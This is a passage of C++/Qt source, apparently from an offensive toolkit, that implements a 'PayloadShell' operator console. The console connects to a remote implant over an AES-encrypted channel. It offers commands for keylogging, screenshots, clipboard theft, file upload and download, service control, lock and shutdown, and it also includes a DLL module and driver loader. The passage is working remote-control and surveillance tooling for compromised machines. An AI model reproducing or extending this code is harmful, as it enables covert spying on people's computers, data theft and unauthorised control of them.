    const QString Host = Session->Host.trimmed().isEmpty() ? "Shell" : Session->Host.trimmed();
    const QString Port = Session->Port.trimmed();
    if (Host.isEmpty())
        return "Shell";
    return Port.isEmpty() ? Host : QString("%1:%2").arg(Host, Port);
}

void PayloadShellUpdateCommandWindowTitle(const std::shared_ptr<PayloadShellSession> &Session)
{
    if (!Session || !Session->CommandDialog)
        return;
    Session->CommandDialog->setWindowTitle(PayloadShellCurrentEndpoint(Session));
}

QString PayloadShellHostItemText(const QString &Host, const QString &Port, const QString &Status)
{
    const QString Endpoint = Port.isEmpty() ? Host : QString("%1:%2").arg(Host, Port);
    return Status.isEmpty() ? Endpoint : QString("%1  |  %2").arg(Endpoint, Status);
}

void PayloadShellRefreshHostItem(QListWidgetItem *Item, const QString &Status, const QColor &Color)
{
    if (!Item)
        return;

    const QString Host = Item->data(KPayloadShellRoleHost).toString();
    const QString Port = Item->data(KPayloadShellRolePort).toString();
    Item->setText(PayloadShellHostItemText(Host, Port, Status));
    Item->setForeground(QBrush(Color));
    Item->setToolTip(Port.isEmpty() ? Host : QString("%1:%2").arg(Host, Port));
}

void PayloadShellRefreshHostList(const std::shared_ptr<PayloadShellState> &State)
{
    if (!State || !State->HostList)
        return;

    for (int Index = 0; Index < State->HostList->count(); ++Index)
    {
        auto *Item = State->HostList->item(Index);
        std::shared_ptr<PayloadShellSession> Session = PayloadShellSessionForItem(State, Item);
        if (Session)
            PayloadShellRefreshHostItem(Item, Session->Status, Session->StatusColor);
        else
            PayloadShellRefreshHostItem(Item, QString(), PrimaryTextColor());
    }
    for (auto &[Id, Session] : State->Sessions)
        PayloadShellUpdateCommandWindowTitle(Session);
}

std::shared_ptr<PayloadShellSession> PayloadShellCreateSession(const std::shared_ptr<PayloadShellState> &State,
                                                               QListWidgetItem *Item,
                                                               const QString &Host,
                                                               const QString &Port,
                                                               const QString &Password)
{
    if (!State || !Item)
        return nullptr;

    auto Session = std::make_shared<PayloadShellSession>();
    Session->Id = State->NextSessionId++;
    Session->State = State;
    Session->HostItem = Item;
    Session->Host = Host.trimmed();
    Session->Port = Port.trimmed();
    Session->Password = Password;
    State->Sessions.emplace(Session->Id, Session);

    Item->setData(KPayloadShellRoleHost, Session->Host);
    Item->setData(KPayloadShellRolePort, Session->Port);
    Item->setData(KPayloadShellRolePassword, Session->Password);
    Item->setData(KPayloadShellRoleSessionId, static_cast<qulonglong>(Session->Id));
    PayloadShellRefreshSessionItem(Session);
    return Session;
}

QStringList PayloadShellCommandSuggestions()
{
    return {"ls",           "cat",        "rm",          "mkdir",       "cp",       "mv",
            "ps",           "kill",       "sysinfo",     "drives",      "netstat",  "wifi",
            "services",     "svc_start",  "svc_stop",    "screenshot",  "wallpaper","msgbox",
            "lock",         "getclip",    "setclip",     "shutdown",    "reboot",   "logoff",
            "keylog start", "keylog stop","cmd ",        "download ",   "upload ",
            "pwd"};
}

QByteArray PayloadShellSha256Hex(const QByteArray &Data)
{
    return QCryptographicHash::hash(Data, QCryptographicHash::Sha256).toHex();
}

bool PayloadShellEncrypt(const QByteArray &Plaintext, const QByteArray &Key, QByteArray *HexCipher, QString *Error)
{
    if (Key.size() != 32)
    {
        if (Error)
            *Error = "Invalid session key length.";
        return false;
    }

    QByteArray Iv(16, '\0');
    if (RAND_bytes(reinterpret_cast<unsigned char *>(Iv.data()), Iv.size()) != 1)
    {
        if (Error)
            *Error = "Failed to generate IV.";
        return false;
    }

    EVP_CIPHER_CTX *Context = EVP_CIPHER_CTX_new();
    if (!Context)
    {
        if (Error)
            *Error = "Failed to create cipher context.";
        return false;
    }

    QByteArray Ciphertext(Plaintext.size() + EVP_MAX_BLOCK_LENGTH, 0);
    int UpdateLength = 0;
    int FinalLength = 0;
    const bool Success =
        EVP_EncryptInit_ex(Context, EVP_aes_256_cbc(), nullptr,
                           reinterpret_cast<const unsigned char *>(Key.constData()),
                           reinterpret_cast<const unsigned char *>(Iv.constData())) == 1 &&
        EVP_EncryptUpdate(Context, reinterpret_cast<unsigned char *>(Ciphertext.data()), &UpdateLength,
                          reinterpret_cast<const unsigned char *>(Plaintext.constData()), Plaintext.size()) == 1 &&
        EVP_EncryptFinal_ex(Context, reinterpret_cast<unsigned char *>(Ciphertext.data()) + UpdateLength,
                            &FinalLength) == 1;
    EVP_CIPHER_CTX_free(Context);
    if (!Success)
    {
        if (Error)
            *Error = "AES encryption failed.";
        return false;
    }

    Ciphertext.truncate(UpdateLength + FinalLength);
    *HexCipher = (Iv + Ciphertext).toHex();
    return true;
}

bool PayloadShellDecrypt(const QByteArray &HexCipher, const QByteArray &Key, QByteArray *Plaintext, QString *Error)
{
    if (Key.size() != 32)
    {
        if (Error)
            *Error = "Invalid session key length.";
        return false;
    }

    const QByteArray Combined = QByteArray::fromHex(HexCipher.trimmed());
    if (Combined.size() <= 16)
    {
        if (Error)
            *Error = "Ciphertext is too short.";
        return false;
    }

    const QByteArray Iv = Combined.left(16);
    const QByteArray Ciphertext = Combined.mid(16);
    EVP_CIPHER_CTX *Context = EVP_CIPHER_CTX_new();
    if (!Context)
    {
        if (Error)
            *Error = "Failed to create decrypt context.";
        return false;
    }

    QByteArray Decrypted(Ciphertext.size() + EVP_MAX_BLOCK_LENGTH, 0);
    int UpdateLength = 0;
    int FinalLength = 0;
    const bool Success =
        EVP_DecryptInit_ex(Context, EVP_aes_256_cbc(), nullptr,
                           reinterpret_cast<const unsigned char *>(Key.constData()),
                           reinterpret_cast<const unsigned char *>(Iv.constData())) == 1 &&
        EVP_DecryptUpdate(Context, reinterpret_cast<unsigned char *>(Decrypted.data()), &UpdateLength,
                          reinterpret_cast<const unsigned char *>(Ciphertext.constData()), Ciphertext.size()) == 1 &&
        EVP_DecryptFinal_ex(Context, reinterpret_cast<unsigned char *>(Decrypted.data()) + UpdateLength,
                            &FinalLength) == 1;
    EVP_CIPHER_CTX_free(Context);
    if (!Success)
    {
        if (Error)
            *Error = "AES decryption failed.";
        return false;
    }

    Decrypted.truncate(UpdateLength + FinalLength);
    *Plaintext = Decrypted;
    return true;
}

void PayloadShellLog(const std::shared_ptr<PayloadShellSession> &Session, const QString &Message,
                     const QColor &Color = QColor("#7CFC00"))
{
    if (!Session)
        return;

    Session->Transcript.append(Message);
    Session->Transcript.append('\n');
    if (!Session->OutputView)
        return;

    QTextCursor Cursor(Session->OutputView->document());
    Cursor.movePosition(QTextCursor::End);
    QTextCharFormat Format;
    Format.setForeground(Color);
    Cursor.insertText(Message + "\n", Format);
    Session->OutputView->setTextCursor(Cursor);
    Session->OutputView->ensureCursorVisible();
}

void PayloadShellSetStatus(const std::shared_ptr<PayloadShellSession> &Session, const QString &Text, const QColor &Color)
{
    if (!Session)
        return;

    Session->Status = Text;
    Session->StatusColor = Color;
    PayloadShellRefreshSessionItem(Session);
    PayloadShellUpdateCommandWindowTitle(Session);
}

void PayloadShellUpdateControls(const std::shared_ptr<PayloadShellState> &State)
{
    if (!State)
        return;

    const std::shared_ptr<PayloadShellSession> Session = PayloadShellCurrentSession(State);
    const bool SocketConnected =
        Session && Session->Socket && Session->Socket->state() == QAbstractSocket::ConnectedState;
    const bool Authenticated = Session && SocketConnected && !Session->SessionKey.isEmpty() && !Session->Authenticating;
    const bool Busy = Session && (Session->Authenticating || !Session->PendingCommand.isEmpty());
    const bool HasSelection = State->HostList && State->HostList->currentItem();

    if (State->ConnectButton)
        State->ConnectButton->setEnabled(!SocketConnected && HasSelection);
    if (State->CommandButton)
        State->CommandButton->setEnabled(HasSelection);
    if (State->DisconnectButton)
        State->DisconnectButton->setEnabled(SocketConnected);
    if (State->NewHostButton)
        State->NewHostButton->setEnabled(true);
    if (State->SaveHostButton)
        State->SaveHostButton->setEnabled(HasSelection && !SocketConnected);
    if (State->RemoveHostButton)
        State->RemoveHostButton->setEnabled(!SocketConnected && HasSelection && State->HostList && State->HostList->count() > 1);
    if (State->HostEdit)
        State->HostEdit->setEnabled(!SocketConnected);
    if (State->PortEdit)
        State->PortEdit->setEnabled(!SocketConnected);
    if (State->PasswordEdit)
        State->PasswordEdit->setEnabled(!SocketConnected);
    if (Session)
    {
        if (Session->SendButton)
            Session->SendButton->setEnabled(Authenticated && !Busy);
        if (Session->ScreenshotButton)
            Session->ScreenshotButton->setEnabled(Authenticated && !Busy);
        if (Session->UploadButton)
            Session->UploadButton->setEnabled(Authenticated && !Busy);
        if (Session->DownloadButton)
            Session->DownloadButton->setEnabled(Authenticated && !Busy);
        if (Session->CommandEdit)
            Session->CommandEdit->setPlaceholderText(Authenticated ? "Enter remote command"
                                                                   : "Connect to the remote host first");
    }
}

void PayloadShellResetConnectionState(const std::shared_ptr<PayloadShellSession> &Session)
{
    if (!Session)
        return;

    Session->ReceiveBuffer.clear();
    Session->SessionKey.clear();
    Session->PendingCommand.clear();
    Session->ExpectedPayloadLength = 0;
    Session->Authenticating = false;
    Session->DisconnectRequested = false;
    Session->ReadState = PayloadShellReadState::Disconnected;
}

void PayloadShellPersistConfiguration(const std::shared_ptr<PayloadShellState> &State)
{
    if (!State)
        return;

    QJsonObject Object = ConfigurationSection("PayloadShell");
    QJsonArray Hosts;
    if (State->HostList)
    {
        for (int Index = 0; Index < State->HostList->count(); ++Index)
        {
            if (auto *Item = State->HostList->item(Index))
            {
                const QString Host = Item->data(KPayloadShellRoleHost).toString().trimmed();
                const QString Port = Item->data(KPayloadShellRolePort).toString().trimmed();
                if (Host.isEmpty())
                    continue;
                QJsonObject HostObject;
                HostObject.insert("Host", Host);
                HostObject.insert("Port", Port);
                Hosts.append(HostObject);
            }
        }
        Object.insert("Hosts", Hosts);
        Object.insert("SelectedHost", std::max(0, State->HostList->currentRow()));
        if (auto *Item = State->HostList->currentItem())
        {
            Object.insert("Host", Item->data(KPayloadShellRoleHost).toString());
            Object.insert("Port", Item->data(KPayloadShellRolePort).toString());
        }
    }
    else
    {
        if (State->HostEdit)
            Object.insert("Host", State->HostEdit->text().trimmed());
        if (State->PortEdit)
            Object.insert("Port", State->PortEdit->text().trimmed());
    }
    Configuration.insert("PayloadShell", Object);
    SaveConfiguration();
}

bool PayloadShellWriteFrame(const std::shared_ptr<PayloadShellSession> &Session, const QByteArray &Payload, QString *Error)
{
    if (!Session || !Session->Socket || Session->Socket->state() != QAbstractSocket::ConnectedState)
    {
        if (Error)
            *Error = "Socket is not connected.";
        return false;
    }

    QByteArray Frame(4, 0);
    const quint32 Length = static_cast<quint32>(Payload.size());
    Frame[0] = static_cast<char>((Length >> 24) & 0xFF);
    Frame[1] = static_cast<char>((Length >> 16) & 0xFF);
    Frame[2] = static_cast<char>((Length >> 8) & 0xFF);
    Frame[3] = static_cast<char>(Length & 0xFF);
    Frame.append(Payload);
    if (Session->Socket->write(Frame) < 0)
    {
        if (Error)
            *Error = Session->Socket->errorString();
        return false;
    }
    Session->Socket->flush();
    return true;
}

bool PayloadShellSendEncrypted(const std::shared_ptr<PayloadShellSession> &Session, const QString &Message, QString *Error)
{
    QByteArray CipherHex;
    if (!PayloadShellEncrypt(Message.toUtf8(), Session->SessionKey, &CipherHex, Error))
        return false;
    return PayloadShellWriteFrame(Session, CipherHex, Error);
}

void ShowPayloadShellCommandDialog(const std::shared_ptr<PayloadShellSession> &Session,
                                   const std::function<void(const QString &)> &SendShellCommand)
{
    if (!Session)
        return;

    if (Session->CommandDialog)
    {
        PayloadShellUpdateCommandWindowTitle(Session);
        Session->CommandDialog->show();
        Session->CommandDialog->raise();
        Session->CommandDialog->activateWindow();
        if (Session->CommandEdit)
            Session->CommandEdit->setFocus();
        return;
    }

    const std::shared_ptr<PayloadShellState> State = Session->State.lock();
    auto *Dialog = new QDialog(State && State->Page ? State->Page->window() : QApplication::activeWindow());
    Dialog->setAttribute(Qt::WA_DeleteOnClose);
    Dialog->setModal(false);
    Dialog->setWindowModality(Qt::NonModal);
    Dialog->resize(980, 680);
    Session->CommandDialog = Dialog;
    PayloadShellUpdateCommandWindowTitle(Session);

    auto *Layout = new QVBoxLayout(Dialog);
    Layout->setContentsMargins(16, 16, 16, 16);
    Layout->setSpacing(12);

    auto *CommandCard = new SimpleCardWidget;
    CommandCard->setBorderRadius(5);
    auto *CommandLayout = new QHBoxLayout(CommandCard);
    CommandLayout->setContentsMargins(16, 16, 16, 16);
    CommandLayout->setSpacing(10);
    auto *CommandEdit = new LineEdit;
    CommandEdit->setClearButtonEnabled(true);
    CommandEdit->setPlaceholderText("Connect to the remote host first");
    auto *Completer = new QCompleter(PayloadShellCommandSuggestions(), CommandEdit);
    Completer->setCaseSensitivity(Qt::CaseInsensitive);
    Completer->setFilterMode(Qt::MatchContains);
    CommandEdit->setCompleter(Completer);
    auto *SendButton = MakeButton("Send", true);
    auto *ScreenshotButton = MakeButton("Screen");
    auto *UploadButton = MakeButton("Upload");
    auto *DownloadButton = MakeButton("Download");
    CommandLayout->addWidget(CommandEdit, 1);
    CommandLayout->addWidget(SendButton);
    CommandLayout->addWidget(ScreenshotButton);
    CommandLayout->addWidget(UploadButton);
    CommandLayout->addWidget(DownloadButton);
    Layout->addWidget(CommandCard);

    auto *OutputCard = new SimpleCardWidget;
    OutputCard->setBorderRadius(5);
    OutputCard->setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Expanding);
    auto *OutputLayout = new QVBoxLayout(OutputCard);
    OutputLayout->setContentsMargins(16, 16, 16, 16);
    OutputLayout->setSpacing(10);
    auto *OutputHeader = new QHBoxLayout;
    ConfigureToolbarLayout(OutputHeader);
    OutputHeader->addWidget(MakeLabel("Session Output", 13, KTextPrimary, QFont::DemiBold));
    OutputHeader->addStretch();
    auto *ClearOutput = MakeButton("Clear");
    OutputHeader->addWidget(ClearOutput);
    auto *ShellOutput = new QTextEdit;
    ShellOutput->setReadOnly(true);
    ShellOutput->setAcceptRichText(false);
    ShellOutput->setFont(QFont("Cascadia Mono", 10));
    ShellOutput->setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Expanding);
    ShellOutput->setStyleSheet(
        "QTextEdit { background: #000000; color: #7CFC00; border: 1px solid rgba(255,255,255,0.08); }");
    ShellOutput->setPlainText(Session->Transcript);
    InstallFluentScrollBar(ShellOutput, Qt::Vertical);
    InstallFluentScrollBar(ShellOutput, Qt::Horizontal);
    OutputLayout->addLayout(OutputHeader);
    OutputLayout->addWidget(ShellOutput, 1);
    Layout->addWidget(OutputCard, 1);

    Session->CommandEdit = CommandEdit;
    Session->SendButton = SendButton;
    Session->ScreenshotButton = ScreenshotButton;
    Session->UploadButton = UploadButton;
    Session->DownloadButton = DownloadButton;
    Session->OutputView = ShellOutput;

    QObject::connect(ClearOutput, &QPushButton::clicked, Dialog, [Session] {
        Session->Transcript.clear();
        if (Session->OutputView)
            Session->OutputView->clear();
    });
    QObject::connect(SendButton, &QPushButton::clicked, Dialog, [SendShellCommand] {
        SendShellCommand(QString());
    });
    QObject::connect(CommandEdit, &QLineEdit::returnPressed, Dialog, [SendShellCommand] {
        SendShellCommand(QString());
    });
    QObject::connect(ScreenshotButton, &QPushButton::clicked, Dialog, [SendShellCommand] {
        SendShellCommand("screenshot");
    });
    QObject::connect(UploadButton, &QPushButton::clicked, Dialog, [Session, SendShellCommand] {
        if (Session->SessionKey.isEmpty())
        {
            PayloadShellLog(Session, "Not connected!", QColor("#FF5F56"));
            return;
        }
        const QString Path = QFileDialog::getOpenFileName(Session->CommandDialog ? Session->CommandDialog->window() : nullptr,
                                                          "Select file to upload", QString(),
                                                          "All files (*.*)");
        if (Path.isEmpty())
            return;
        QFile File(Path);
        if (!File.open(QIODevice::ReadOnly))
        {
            PayloadShellLog(Session, "Upload error: failed to read file.", QColor("#FF5F56"));
            return;
        }
        const QByteArray Data = File.readAll();
        const QString Command = QString("upload %1 %2")
                                    .arg(QFileInfo(Path).fileName(), QString::fromLatin1(Data.toBase64()));
        if (Session->CommandEdit)
            Session->CommandEdit->setText(Command);
        SendShellCommand(Command);
    });
    QObject::connect(DownloadButton, &QPushButton::clicked, Dialog, [Session] {
        if (Session->CommandEdit)
        {
            Session->CommandEdit->setText("download ");
            Session->CommandEdit->setFocus();
            Session->CommandEdit->setCursorPosition(Session->CommandEdit->text().size());
        }
    });
    QObject::connect(Dialog, &QObject::destroyed, qApp, [Session, CommandEdit, SendButton, ScreenshotButton, UploadButton, DownloadButton, ShellOutput] {
        if (Session->CommandEdit == CommandEdit)
            Session->CommandEdit = nullptr;
        if (Session->SendButton == SendButton)
            Session->SendButton = nullptr;
        if (Session->ScreenshotButton == ScreenshotButton)
            Session->ScreenshotButton = nullptr;
        if (Session->UploadButton == UploadButton)
            Session->UploadButton = nullptr;
        if (Session->DownloadButton == DownloadButton)
            Session->DownloadButton = nullptr;
        if (Session->OutputView == ShellOutput)
            Session->OutputView = nullptr;
        Session->CommandDialog = nullptr;
    });

    PayloadShellUpdateControls(State);
    Dialog->show();
    Dialog->raise();
    Dialog->activateWindow();
    CommandEdit->setFocus();
}

void PayloadShellShowScreenshot(const std::shared_ptr<PayloadShellSession> &Session, const QByteArray &PngBytes)
{
    QPixmap Pixmap;
    if (!Pixmap.loadFromData(PngBytes))
    {
        PayloadShellLog(Session, "Failed to decode screenshot.", QColor("#FF5F56"));
        return;
    }

    const std::shared_ptr<PayloadShellState> State = Session ? Session->State.lock() : nullptr;
    auto *Dialog = new QDialog(State && State->Page ? State->Page->window() : QApplication::activeWindow());
    Dialog->setAttribute(Qt::WA_DeleteOnClose);
    Dialog->setWindowTitle("Remote Screenshot");
    Dialog->resize(900, 640);
    auto *Layout = new QVBoxLayout(Dialog);
    Layout->setContentsMargins(16, 16, 16, 16);
    Layout->setSpacing(10);
    auto *Image = new QLabel;
    Image->setAlignment(Qt::AlignCenter);
    Image->setScaledContents(true);
    Image->setPixmap(Pixmap);
    Image->setMinimumSize(640, 420);
    auto *Buttons = new QHBoxLayout;
    Buttons->setContentsMargins(0, 0, 0, 0);
    Buttons->setSpacing(8);
    auto *Save = MakeButton("Save As...");
    auto *Close = MakeButton("Close", true);
    Buttons->addStretch();
    Buttons->addWidget(Save);
    Buttons->addWidget(Close);
    Layout->addWidget(Image, 1);
    Layout->addLayout(Buttons);
    QObject::connect(Save, &QPushButton::clicked, Dialog, [Dialog, PngBytes] {
        const QString Path = QFileDialog::getSaveFileName(Dialog, "Save screenshot", "screenshot.png",
                                                          "PNG Image (*.png)");
        if (Path.isEmpty())
            return;
        QFile File(Path);
        if (File.open(QIODevice::WriteOnly))
            File.write(PngBytes);
    });
    QObject::connect(Close, &QPushButton::clicked, Dialog, &QDialog::accept);
    Dialog->show();
}

void PayloadShellHandleResponse(const std::shared_ptr<PayloadShellSession> &Session, const QString &Command,
                                const QString &Response)
{
    const QString NormalizedCommand = Command.trimmed().toLower();
    if (Response.startsWith("ERR:"))
    {
        PayloadShellLog(Session, Response, QColor("#FF5F56"));
        return;
    }

    if (NormalizedCommand == "screenshot" || NormalizedCommand.startsWith("download "))
    {
        const QString Data = Response.startsWith("OK\n") ? Response.mid(3).trimmed() : Response.trimmed();
        if (NormalizedCommand == "screenshot")
        {
            const QByteArray ImageBytes = QByteArray::fromHex(Data.toLatin1());
            if (ImageBytes.isEmpty())
            {
                PayloadShellLog(Session, "Failed to decode screenshot payload.", QColor("#FF5F56"));
                return;
            }
            PayloadShellShowScreenshot(Session, ImageBytes);
            PayloadShellLog(Session, QString("Screenshot received (%1 bytes)").arg(ImageBytes.size()),
                            QColor("#27C93F"));
            return;
        }

        const QByteArray FileBytes = QByteArray::fromBase64(Data.toLatin1());
        if (FileBytes.isEmpty() && !Data.isEmpty())
        {
            PayloadShellLog(Session, "ERR: failed to decode file data", QColor("#FF5F56"));
            return;
        }

        QString FileName = QFileInfo(NormalizedCommand.mid(9).trimmed()).fileName();
        if (FileName.isEmpty())
            FileName = "download.bin";
        const std::shared_ptr<PayloadShellState> State = Session ? Session->State.lock() : nullptr;
        const QString Path = QFileDialog::getSaveFileName(State && State->Page ? State->Page->window() : nullptr,
                                                          "Save downloaded file", FileName,
                                                          "All files (*.*)");
        if (Path.isEmpty())
            return;

        QFile File(Path);
        if (!File.open(QIODevice::WriteOnly))
        {
            PayloadShellLog(Session, "ERR: failed to save downloaded file", QColor("#FF5F56"));
            return;
        }
        File.write(FileBytes);
        PayloadShellLog(Session, QString("Saved to: %1 (%2 bytes)")
                                   .arg(QDir::toNativeSeparators(Path))
                                   .arg(FileBytes.size()),
                        QColor("#27C93F"));
        return;
    }

    const QString Text = Response.startsWith("OK\n") ? Response.mid(3) : Response;
    PayloadShellLog(Session, Text, QColor("#7CFC00"));
}

void PayloadShellProcessBuffer(const std::shared_ptr<PayloadShellState> &State,
                               const std::shared_ptr<PayloadShellSession> &Session)
{
    if (!State || !Session)
        return;

    while (true)
    {
        if (Session->ReadState == PayloadShellReadState::AwaitChallenge)
        {
            const int NewLineIndex = Session->ReceiveBuffer.indexOf('\n');
            if (NewLineIndex < 0)
                return;

            const QByteArray Message = Session->ReceiveBuffer.left(NewLineIndex).trimmed();
            Session->ReceiveBuffer.remove(0, NewLineIndex + 1);
            if (!Message.startsWith("CHALLENGE:") || Message.size() < 74)
            {
                PayloadShellLog(Session, "Error: invalid handshake", QColor("#FF5F56"));
                PayloadShellSetStatus(Session, "Handshake failed", QColor("#FF5F56"));
                if (Session->Socket)
                    Session->Socket->disconnectFromHost();
                return;
            }

            const QByteArray Challenge = Message.mid(10);
            const QByteArray PasswordHash = PayloadShellSha256Hex(Session->Password.toUtf8());
            const QByteArray SessionKeyHex = PayloadShellSha256Hex(PasswordHash + Challenge);
            Session->SessionKey = QByteArray::fromHex(SessionKeyHex);
            PayloadShellLog(Session, "Challenge received: " + QString::fromLatin1(Challenge), QColor("#4FC3F7"));
            PayloadShellLog(Session, "PasswordHash: " + QString::fromLatin1(PasswordHash), QColor("#4FC3F7"));
            PayloadShellLog(Session, "SessionKey: " + QString::fromLatin1(SessionKeyHex), QColor("#4FC3F7"));

            QString Error;
            if (!PayloadShellSendEncrypted(Session, "AUTH:" + QString::fromLatin1(PasswordHash), &Error))
            {
                PayloadShellLog(Session, "Auth send failed: " + Error, QColor("#FF5F56"));
                PayloadShellSetStatus(Session, "Auth send failed", QColor("#FF5F56"));
                if (Session->Socket)
                    Session->Socket->disconnectFromHost();
                return;
            }

            Session->Authenticating = true;
            Session->ReadState = PayloadShellReadState::AwaitLength;
            PayloadShellUpdateControls(State);
            continue;
        }

        if (Session->ReadState == PayloadShellReadState::AwaitLength)
        {
            if (Session->ReceiveBuffer.size() < 4)
                return;

            const quint32 Length = (static_cast<unsigned char>(Session->ReceiveBuffer[0]) << 24) |
                                   (static_cast<unsigned char>(Session->ReceiveBuffer[1]) << 16) |
                                   (static_cast<unsigned char>(Session->ReceiveBuffer[2]) << 8) |
                                   static_cast<unsigned char>(Session->ReceiveBuffer[3]);
            Session->ReceiveBuffer.remove(0, 4);
            if (Length == 0 || Length > 100u * 1024u * 1024u)
            {
                PayloadShellLog(Session, "Receive failed: invalid packet length.", QColor("#FF5F56"));
                if (Session->Socket)
                    Session->Socket->disconnectFromHost();
                return;
            }
            Session->ExpectedPayloadLength = static_cast<int>(Length);
            Session->ReadState = PayloadShellReadState::AwaitPayload;
            continue;
        }

        if (Session->ReadState == PayloadShellReadState::AwaitPayload)
        {
            if (Session->ReceiveBuffer.size() < Session->ExpectedPayloadLength)
                return;

            const QByteArray Packet = Session->ReceiveBuffer.left(Session->ExpectedPayloadLength);
            Session->ReceiveBuffer.remove(0, Session->ExpectedPayloadLength);
            Session->ExpectedPayloadLength = 0;
            Session->ReadState = PayloadShellReadState::AwaitLength;

            QByteArray Plaintext;
            QString Error;
            if (!PayloadShellDecrypt(Packet, Session->SessionKey, &Plaintext, &Error))
            {
                PayloadShellLog(Session, "Receive failed: " + Error, QColor("#FF5F56"));
                if (Session->Socket)
                    Session->Socket->disconnectFromHost();
                return;
            }

            const QString Response = QString::fromUtf8(Plaintext);
            if (Session->Authenticating)
            {
                Session->Authenticating = false;
                if (Response == "AUTH_OK")
                {
                    PayloadShellLog(Session, "Connected!", QColor("#27C93F"));
                    PayloadShellSetStatus(Session, "Connected", QColor("#27C93F"));
                    if (Session->CommandEdit)
                        Session->CommandEdit->setFocus();
                }
                else
                {
                    PayloadShellLog(Session, "Auth failed: " + Response, QColor("#FF5F56"));
                    PayloadShellSetStatus(Session, "Auth failed", QColor("#FF5F56"));
                    if (Session->Socket)
                        Session->Socket->disconnectFromHost();
                }
                PayloadShellUpdateControls(State);
                continue;
            }

            const QString PendingCommand = Session->PendingCommand;
            Session->PendingCommand.clear();
            PayloadShellUpdateControls(State);
            if (Response == "BYE")
            {
                PayloadShellLog(Session, "Server closed connection.", QColor("#4FC3F7"));
                if (Session->Socket)
                    Session->Socket->disconnectFromHost();
                return;
            }
            PayloadShellHandleResponse(Session, PendingCommand, Response);
            continue;
        }

        return;
    }
}

ModuleEntry *FindDllModule(const QString &Path)
{
    const auto Match = std::find_if(DllModules.begin(), DllModules.end(), [&Path](const ModuleEntry &Module) {
        return QString::fromStdString(Module.Path) == Path;
    });
    return Match == DllModules.end() ? nullptr : &*Match;
}

std::wstring WidePath(const QString &Path)
{
    return Path.toStdWString();
}

bool OptionNameMatches(const std::string &Name, const QStringList &Aliases)
{
    const QString CurrentName = QString::fromStdString(Name);
    for (const QString &Alias : Aliases)
    {
        if (CurrentName.compare(Alias, Qt::CaseInsensitive) == 0)
            return true;
    }
    return false;
}

QString CachedModuleOptionValue(const ModuleEntry &Module, const QStringList &Aliases)
{
    for (const ModuleOption &Option : Module.Options)
    {
        if (OptionNameMatches(Option.Name, Aliases))
            return QString::fromStdString(Option.Value);
    }
    return {};
}

void SetCachedModuleOptionValue(ModuleEntry &Module, const QStringList &Aliases, const QString &Value)
{
    for (ModuleOption &Option : Module.Options)
    {
        if (OptionNameMatches(Option.Name, Aliases))
            Option.Value = Utf8Bytes(Value);
    }
    if (Module.ModuleInstance)
    {
        auto *Instance = static_cast<ModuleBase *>(Module.ModuleInstance);
        for (const auto &[Name, OptionPointer] : Instance->GetOptions())
        {
            Q_UNUSED(OptionPointer);
            if (OptionNameMatches(Name, Aliases))
                Instance->SetOption(Name, Utf8Bytes(Value));
        }
    }
}

QString NormalizedServiceName(QString Name)
{
    if (Name.isEmpty())
        Name = "Driver";
    for (QChar &Character : Name)
    {
        if (!Character.isLetterOrNumber() && Character != '_' && Character != '-')
            Character = '_';
    }
    return Name.left(120);
}

void DestroyModuleInstance(ModuleEntry &Module)
{
    if (!Module.Handle)
        return;
    if (Module.ModuleInstance)
    {
        const auto Destroy = reinterpret_cast<void (*)(ModuleBase *)>(GetProcAddress(Module.Handle, "DestroyModule"));
        if (Destroy)
            Destroy(static_cast<ModuleBase *>(Module.ModuleInstance));
        Module.ModuleInstance = nullptr;
    }
    FreeLibrary(Module.Handle);
    Module.Handle = nullptr;
    Module.Loaded = false;
}

bool LoadModuleInstance(ModuleEntry &Module, QString *Error = nullptr)
{
    if (Module.Loaded && Module.Handle && Module.ModuleInstance)
        return true;
    const std::wstring Path = WidePath(QString::fromStdString(Module.Path));
    HMODULE Handle = LoadLibraryW(Path.c_str());
    if (!Handle)
    {
        if (Error)
            *Error = QString("LoadLibrary failed (%1)").arg(GetLastError());
        return false;
    }
    const auto Create = reinterpret_cast<ModuleBase *(*)()>(GetProcAddress(Handle, "CreateModule"));
    const auto Destroy = reinterpret_cast<void (*)(ModuleBase *)>(GetProcAddress(Handle, "DestroyModule"));
    if (!Create || !Destroy)
    {
        FreeLibrary(Handle);
        if (Error)
            *Error = "CreateModule/DestroyModule exports were not found.";
        return false;
    }
    ModuleBase *Instance = Create();
    if (!Instance)
    {
        FreeLibrary(Handle);
        if (Error)
            *Error = "CreateModule returned null.";
        return false;
    }
    Module.Handle = Handle;
    Module.ModuleInstance = Instance;
    for (const ModuleOption &Option : Module.Options)
    {
        if (!Option.Value.empty())
            Instance->SetOption(Option.Name, Option.Value);
    }
    Module.Loaded = true;
    return true;
}

ModuleEntry ProbeModuleFile(const QString &Path)
{
    ModuleEntry Module;
    Module.Path = Utf8Bytes(QFileInfo(Path).absoluteFilePath());
    Module.Name = Utf8Bytes(QFileInfo(Path).completeBaseName());
    Module.Category = "DLL Module";
    Module.Description = Module.Name;
    Module.Author = "Unknown";
    QString Error;
    if (!LoadModuleInstance(Module, &Error))
    {
        Module.Valid = false;
        Module.Description = Utf8Bytes(Error);
        return Module;
    }
    ModuleBase *Instance = static_cast<ModuleBase *>(Module.ModuleInstance);
    const ModuleInfo Info = Instance->Info();
    Module.Name = Info.Name.empty() ? Module.Name : Info.Name;
    Module.Description = Info.Description.empty() ? Module.Name : Info.Description;
    Module.Author = Info.Author.empty() ? "Unknown" : Info.Author;
    Module.Category = ModuleTypeToString(Info.Type);
    for (const auto &[Name, OptionPointer] : Instance->GetOptions())
    {
        ModuleOption Item;
        Item.Name = Name;
        Item.Type = OptionPointer->TypeName();
        Item.Value = OptionPointer->GetValue();
        Item.Default = OptionPointer->GetDefaultValue();
        Item.Description = OptionPointer->GetDescription();
        Item.Required = OptionPointer->GetRequired() == OptionRequired::Required;
        Module.Options.push_back(Item);
    }
    DestroyModuleInstance(Module);
    Module.Valid = true;
    return Module;
}

bool SetDriverLoaded(ModuleEntry &Module, bool Loaded, QString *Error = nullptr);
bool QueryDriverLoadedState(ModuleEntry &Module);

bool InvokeModuleWithSeh(ModuleBase *Instance, bool *Result, DWORD *ExceptionCode)
{
    if (Result)
        *Result = false;
    if (ExceptionCode)
        *ExceptionCode = ERROR_SUCCESS;

    __try
    {
        if (Result)
            *Result = Instance->Run();
        return true;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        if (ExceptionCode)
            *ExceptionCode = GetExceptionCode();
        return false;
    }
}

void ScanRuntimeModules()
{
